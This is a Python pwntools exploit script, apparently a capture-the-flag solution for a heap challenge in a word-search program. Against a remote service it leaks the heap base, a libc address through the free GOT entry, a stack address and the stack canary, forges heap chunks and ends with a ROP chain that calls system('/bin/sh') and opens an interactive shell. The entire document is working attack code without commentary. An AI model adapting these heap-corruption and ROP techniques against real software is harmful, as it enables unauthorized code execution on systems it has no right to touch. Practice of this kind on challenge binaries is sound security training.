from pwn import *
import re

r = remote('10.211.55.16', 8888)


def SEARCH(s,recv = 1):
    if recv :
        r.recvuntil('3: Quit\n')
    r.sendline('1')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the word:\n')
    r.sendline(s)

def DEL(s,recv = 1):
    if recv :
        r.recvuntil('3: Quit\n')
    r.sendline('1')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the word:\n')
    r.send(s)
    r.recvuntil('(y/n)?\n')
    r.sendline('y')

def INPUT(s,recv=1):
    if recv :
        r.recvuntil('3: Quit\n')
    r.sendline('2')
    r.recvuntil('size:\n')
    r.sendline(str(len(s)))
    r.recvuntil('Enter the sentence:\n')
    r.send(s)

INPUT('a aaaaaa')
INPUT('b b')
DEL('b')
DEL('a')
INPUT('a')
SEARCH('a')
r.recvuntil('(y/n)?\n')
r.sendline('y')
s = r.recvuntil('(y/n)?\n')
a = s.split('\n')
b = a[1].split(' ')
heap_base = u64(b[2] + '\x00'*(8 - len(b[2]))) & 0xFFFFFF00
print "heap base :",hex(heap_base)

r.sendline('a')

INPUT('a'*40)
INPUT('a'*40)
SEARCH('a'*40)
r.recvuntil('(y/n)?\n')
r.sendline('y')
r.recvuntil('(y/n)?\n')
r.sendline('n')
INPUT('b'*40)
    
realstruct = p64(heap_base + 0x220)
realstruct += p64(0x28)
realstruct += p64(heap_base + 0x220)
realstruct += p64(0x28)
realstruct += p64(heap_base + 0x1f0)


SEARCH(realstruct)
r.recvuntil('(y/n)?\n')
r.sendline('y')
INPUT('b'*56)

fake = p64(heap_base+0x160)
fake += p64(0x28)
fake += p64(0x602018) #free_got
fake += p64(0x8)
fake += p64(0)
INPUT(fake)
SEARCH("a"*40)
data =  r.recvuntil('(y/n)?\n')
match = re.search("Found 8:.*",data)
libc = u64(match.group()[9:17]) - 0X82df0
print "libc : ",hex(libc)
r.sendline('n')

INPUT('e'*40)
INPUT('e'*40)
SEARCH('e'*40)
r.recvuntil('(y/n)?\n')
r.sendline('y')
r.recvuntil('(y/n)?\n')
r.sendline('n')
INPUT('c'*40)

realstruct2 = p64(heap_base + 0x3e0)
realstruct2 += p64(0x28)
realstruct2 += p64(heap_base + 0x3e0)
realstruct2 += p64(0x28)
realstruct2 += p64(heap_base + 0x3b0)
SEARCH(realstruct2)
r.recvuntil('(y/n)?\n')
r.sendline('y')
INPUT('f'*56)

r.sendline('a'*48)



r.recvuntil('number')
r.sendline('a'*48)

data = r.recvuntil('number')[49:55].ljust(8,"\x00")
stackaddr = u64(data)

canaryaddr = stackaddr + 0x38 - 0x180

print "canaryaddr :",hex(canaryaddr)

fake2 = p64(heap_base+0X280)
fake2 += p64(0X28)
fake2 += p64(canaryaddr+1)
fake2 += p64(0X7)
fake2 += p64(0)
INPUT(fake2,0)

r.sendline("a")
r.recvuntil('number')

r.sendline("a")
r.recvuntil('number')

r.sendline("a")
r.recvuntil('number')
r.sendline("a")
r.recvuntil('number')
r.sendline("a")
r.recvuntil('number')

SEARCH("b"*40,0)
data =  r.recvuntil("(y/n)?")
match = re.search("Found 7:.*",data)
canary = u64(match.group()[9:16].rjust(8,"\x00"))
print "canary :",hex(canary)

r.sendline("n")

INPUT('g'*40)
INPUT('g'*40)
SEARCH('g'*40)
r.recvuntil('(y/n)?\n')
r.sendline('y')
r.recvuntil('(y/n)?\n')
r.sendline('n')
INPUT('g'*40)



realstruct3 = p64(heap_base + 0x570)
realstruct3 += p64(0x28)
realstruct3 += p64(heap_base + 0x570)
realstruct3 += p64(0x28)
realstruct3 += p64(heap_base + 0x540)

SEARCH(realstruct3)

r.recvuntil('(y/n)?\n')
r.sendline('y')
INPUT('f'*56)


fake3 = p64(heap_base+0x280)
fake3 += p64(0x28)
fake3 += p64(canaryaddr-0x78)
fake3 += p64(0x8)
fake3 += p64(0)
INPUT(fake3,0)

r.sendline("x"*48)
r.recvuntil('number')
r.sendline("y"*48)
r.recvuntil('number')
r.sendline("z"*48)
r.recvuntil('number')

r.sendline(p64(0x81)*6)
r.recvuntil('number')
r.sendline(p64(0)+p64(0x21)+"b"*16 + p64(0) + p64(0x21))
r.recvuntil('number')
r.sendline("c"*24 + p64(0x71) + "c"*16)
r.recvuntil('number')

DEL("b"*40,0)


r.sendline("x"*24 + p64(0x51) + p64(0)*2)
r.recvuntil('number')
r.sendline("y"*48)
r.recvuntil('number')
r.sendline("z"*48)
r.recvuntil('number')

r.sendline(p64(0x81)*6)
r.recvuntil('number')
r.sendline(p64(0)+p64(0x21)+"b"*16 + p64(0) + p64(0x21))
r.recvuntil('number')
r.sendline("c"*24 + p64(0x71) + p64(canaryaddr+0x158) + p64(0))
r.recvuntil('number')

INPUT("a"*96,0)

r.sendline("x"*24 + p64(0x71) + p64(0))
r.recvuntil('number')


r.sendline("y"*48)
r.recvuntil('number')
r.sendline("z"*48)
r.recvuntil('number')

system = libc + 0x46640
binsh = libc + 0x17ccdb
poprdi = 0x400e23
payload = p64(poprdi)
payload += p64(binsh)
payload += p64(system)
payload = payload.ljust(48,"a")


SEARCH("A"*8 + p64(0x61) + "b"*24 + payload + p64(0x21),0)

r.interactive()

